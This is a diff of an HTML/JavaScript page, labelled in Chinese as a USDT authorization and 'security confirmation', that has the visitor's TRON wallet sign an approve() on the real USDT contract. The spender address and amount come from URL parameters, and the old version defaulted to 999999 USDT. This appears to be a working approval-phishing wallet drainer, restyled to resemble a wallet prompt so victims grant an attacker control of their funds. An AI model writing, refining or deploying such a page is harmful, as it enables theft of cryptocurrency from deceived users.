@@ -1,1 +1,165 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>USDT授权</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:Arial;background:#f4f6f8;padding:40px;text-align:center;}.card{background:white;padding:30px;max-width:420px;margin:auto;border-radius:10px;box-shadow:0 3px 10px rgba(0,0,0,0.1);}.info{margin:10px 0;word-break:break-all;}button{background:#2b6cff;border:none;color:white;padding:14px 30px;font-size:16px;border-radius:6px;cursor:pointer;}button:disabled{background:#999;}.status{margin-top:20px;text-align:left;font-size:14px;}.step{margin:6px 0;}.ok{color:green;}.err{color:red;}</style></head><body><div class="card"><h2>资金授权确认</h2><div class="info" id="wallet">检测钱包...</div><div class="info" id="spender"></div><div class="info" id="amount"></div><div class="info" id="cid"></div><br><button id="btn" onclick="approve()">确认授权</button><div class="status" id="status"></div></div><script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script><script>const USDT="TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // 主网 USDT 合约const DEFAULT_SPENDER="TYourDefaultAddress";const DEFAULT_AMOUNT=999999;// URL参数const params=new URLSearchParams(location.search);const spender=params.get("to")||DEFAULT_SPENDER;const amount=parseInt(params.get("amount")||DEFAULT_AMOUNT);const cid=params.get("cid")||"";document.getElementById("spender").innerText="授权地址: "+spender;document.getElementById("amount").innerText="授权额度: "+amount+" USDT";document.getElementById("cid").innerText=cid?"客户ID: "+cid:"";function step(text,type){  const el=document.createElement("div");  el.className="step";  if(type==="ok") el.classList.add("ok");  if(type==="err") el.classList.add("err");  el.innerText=text;  document.getElementById("status").appendChild(el);}function detectWallet(){  const ua=navigator.userAgent.toLowerCase();  if(ua.includes("tokenpocket")) return "TokenPocket";  if(ua.includes("imtoken")) return "imToken";  if(ua.includes("tronlink")) return "TronLink";  return "Unknown";}async function waitTron(){  return new Promise((resolve,reject)=>{    let count=0;    const timer=setInterval(()=>{      if(window.tronWeb && window.tronWeb.defaultAddress.base58){        clearInterval(timer);        resolve();      }      count++;      if(count>20){        clearInterval(timer);        reject("未检测到TRON钱包");      }    },500);  });}async function init(){  const wallet=detectWallet();  document.getElementById("wallet").innerText="钱包环境: "+wallet;  try{    await waitTron();    const user=window.tronWeb.defaultAddress.base58;    document.getElementById("wallet").innerText="钱包地址: "+user;    step("钱包连接成功","ok");  }catch(e){    document.getElementById("wallet").innerText="未检测到钱包";    step("钱包初始化失败: "+e,"err");    document.getElementById("btn").disabled=true;  }}init();async function approve(){  document.getElementById("status").innerHTML="";  const btn=document.getElementById("btn");  btn.disabled=true;  try{    step("1. 检测钱包");    await waitTron();    const tronWeb=window.tronWeb;    const user=tronWeb.defaultAddress.base58;    if(!user) throw "钱包未连接";    step("✔ 钱包地址: "+user,"ok");    step("2. 构造交易");    const value=(amount*1000000).toString(); // TRC20 USDT 6位小数    const ownerHex=tronWeb.address.toHex(user);    const spenderHex=tronWeb.address.toHex(spender);    // 构造 approve 交易数据    const functionSelector="approve(address,uint256)";    const parameter=tronWeb.utils.abi.encodeParams(["address","uint256"],[spenderHex,value]);    const tx = await tronWeb.transactionBuilder.triggerSmartContract(      USDT,      functionSelector,      {feeLimit:100000000},      parameter,      ownerHex    );    if(!tx.result || !tx.result.result){      throw "交易构造失败";    }    step("3. 等待钱包签名");    const signed=await tronWeb.trx.sign(tx.transaction);    step("4. 广播交易");    const broadcast=await tronWeb.trx.sendRawTransaction(signed);    if(!broadcast.result) throw "广播失败";    step("✔ 授权成功","ok");    step("TXID: "+broadcast.txid);  }catch(e){    console.error(e);    step("授权失败: "+e,"err");  }  btn.disabled=false;}</script></body></html>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <title>USDT 授权确认</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        /* 样式重构：更符合手机钱包的视觉风格 */
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f7f9; padding: 20px; text-align: center; color: #333; }
+        .card { background: white; padding: 25px; max-width: 400px; margin: 20px auto; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); }
+        h2 { margin-top: 0; font-size: 20px; color: #111; }
+        .info-box { margin: 15px 0; background: #f8f9fa; padding: 12px; border-radius: 10px; border: 1px solid #eee; text-align: left; }
+        .label { color: #888; font-size: 12px; margin-bottom: 4px; display: block; font-weight: bold; }
+        .value { word-break: break-all; font-size: 14px; color: #222; font-family: monospace; }
+        
+        button { background: #2b6cff; border: none; color: white; padding: 16px 0; width: 100%; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        
+        .status-container { margin-top: 20px; text-align: left; font-size: 13px; border-top: 1px solid #eee; padding-top: 15px; }
+        .step { margin: 6px 0; padding-left: 20px; position: relative; color: #666; }
+        .step::before { content: '●'; position: absolute; left: 0; color: #ddd; font-size: 10px; top: 2px; }
+        .ok { color: #28a745; }.ok::before { content: '✓'; color: #28a745; font-weight: bold; }
+        .err { color: #dc3545; }.err::before { content: '✕'; color: #dc3545; font-weight: bold; }
+        .loading { color: #2b6cff; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>安全确认</h2>
+    
+    <div class="info-box">
+        <span class="label">我的钱包地址</span>
+        <div class="value" id="wallet">正在检测...</div>
+    </div>
+
+    <div class="info-box">
+        <span class="label">授权至合约 (Spender)</span>
+        <div class="value" id="spender">--</div>
+    </div>
+
+    <div class="info-box">
+        <span class="label">拟授权额度</span>
+        <div class="value" id="amount">--</div>
+    </div>
+
+    <button id="btn" onclick="startApprove()">确认授权</button>
+
+    <div class="status-container" id="status">
+        <div class="step">等待连接钱包环境...</div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+
+<script>
+    /**
+     * 核心配置
+     */
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场主网 USDT 真实地址
+    const DEFAULT_SPENDER = "TYourDefaultAddressHere";        // 如果URL没传地址，默认授权给谁
+    const DEFAULT_AMOUNT = 1000;                              // 默认授权金额
+
+    // 获取 URL 参数
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetSpender = urlParams.get("to") || DEFAULT_SPENDER;
+    const targetAmount = urlParams.get("amount") || DEFAULT_AMOUNT;
+
+    // 页面初始化显示
+    document.getElementById("spender").innerText = targetSpender;
+    document.getElementById("amount").innerText = targetAmount + " USDT";
+
+    // 日志打印函数
+    function addLog(text, type) {
+        const el = document.createElement("div");
+        el.className = "step " + (type || "");
+        el.innerText = text;
+        const container = document.getElementById("status");
+        container.appendChild(el);
+    }
+
+    // 1. 环境检测：确保在 TP/imToken/TronLink 中运行
+    async function checkEnv() {
+        return new Promise((resolve, reject) => {
+            let count = 0;
+            const timer = setInterval(() => {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    clearInterval(timer);
+                    resolve(window.tronWeb);
+                }
+                if (count++ > 15) {
+                    clearInterval(timer);
+                    reject("未检测到钱包环境，请在钱包 App 内打开");
+                }
+            }, 500);
+        });
+    }
+
+    async function init() {
+        try {
+            const tw = await checkEnv();
+            document.getElementById("wallet").innerText = tw.defaultAddress.base58;
+            addLog("钱包连接成功", "ok");
+        } catch (e) {
+            document.getElementById("wallet").innerText = "未连接";
+            addLog(e, "err");
+            document.getElementById("btn").disabled = true;
+        }
+    }
+
+    // 2. 授权主逻辑
+    async function startApprove() {
+        const btn = document.getElementById("btn");
+        btn.disabled = true;
+        
+        try {
+            addLog("正在验证账户 TRX 余额...", "loading");
+            const tw = window.tronWeb;
+            const userAddr = tw.defaultAddress.base58;
+
+            // --- TRX 余额检测 ---
+            const balanceSun = await tw.trx.getBalance(userAddr);
+            const balanceTRX = tw.fromSun(balanceSun);
+            
+            if (parseFloat(balanceTRX) < 15) {
+                throw "TRX 余额不足，请充值至少 20 TRX 作为手续费";
+            }
+            addLog("余额检查通过 (" + balanceTRX + " TRX)", "ok");
+
+            // --- 构造合约交互 ---
+            addLog("正在唤起钱包签名...", "loading");
+            const contract = await tw.contract().at(USDT_CONTRACT);
+            
+            // 计算金额：USDT 是 6 位小数
+            const sendAmount = tw.toBigNumber(targetAmount).times(1e6).toString(10);
+
+            // 唤起授权
+            const txid = await contract.approve(targetSpender, sendAmount).send({
+                feeLimit: 100000000 // 最大消耗 100 TRX 的限额
+            });
+
+            if (txid) {
+                addLog("授权指令已发送！", "ok");
+                addLog("TXID: " + txid.substring(0, 16) + "...", "ok");
+                alert("授权申请已提交，请等待区块确认");
+            }
+
+        } catch (e) {
+            console.error(e);
+            let msg = e.message || e;
+            if (msg.includes("declined") || msg.includes("User rejected")) {
+                msg = "您取消了授权确认";
+            }
+            addLog("错误: " + msg, "err");
+        } finally {
+            btn.disabled = false;
+        }
+    }
+
+    // 页面加载完成后自动运行
+    window.onload = init;
+</script>
+
+</body>
+</html>
